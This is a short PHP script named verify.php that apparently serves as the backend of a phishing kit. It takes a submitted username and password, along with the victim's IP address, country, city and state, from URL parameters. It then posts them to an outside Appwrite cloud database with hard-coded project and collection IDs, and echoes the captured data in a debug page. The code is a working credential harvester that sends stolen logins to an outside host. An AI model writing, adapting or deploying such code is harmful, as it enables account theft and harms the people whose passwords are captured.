<?php
// ============================================
// VERIFY.PHP - SIMPLE VERSION
// ============================================

// Get data
$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';
$ip = $_GET['ip'] ?? '';
$country = $_GET['country'] ?? '';
$city = $_GET['city'] ?? '';
$state = $_GET['state'] ?? '';

// Appwrite config
$endpoint = 'https://fra.cloud.appwrite.io/v1';
$projectId = '6a40566e0000ce24258e';
$apiKey = 'standard_e...';  // ← PUT YOUR FULL API KEY HERE!
$databaseId = '6a4056fe0011aa4462d6';
$collectionId = '6a4057910024491b6393';

// Build data
$data = [
    'username' => $u,
    'password' => $p,
    'ip' => $ip,
    'country' => $country,
    'city' => $city,
    'state' => $state,
    'timestamp' => date('Y-m-d H:i:s')
];

$url = "$endpoint/databases/$databaseId/collections/$collectionId/documents";

// Send via file_get_contents (fallback)
$options = [
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/json\r\n" .
                    "X-Appwrite-Project: $projectId\r\n" .
                    "X-Appwrite-Key: $apiKey\r\n",
        'content' => json_encode($data),
        'ignore_errors' => true
    ]
];

$context = stream_context_create($options);
$result = @file_get_contents($url, false, $context);

// Show what happened
echo "<h1>Debug</h1>";
echo "Data sent: " . json_encode($data) . "<br><br>";
echo "URL: $url<br><br>";
echo "Result: " . htmlspecialchars($result) . "<br><br>";

if ($result === false) {
    echo "❌ Failed to send! Check API key and permissions.";
} else {
    $response = json_decode($result, true);
    if (isset($response['$id'])) {
        echo "✅ Success! Document ID: " . $response['$id'];
    } else {
        echo "❌ Error: " . htmlspecialchars($result);
    }
}
?>
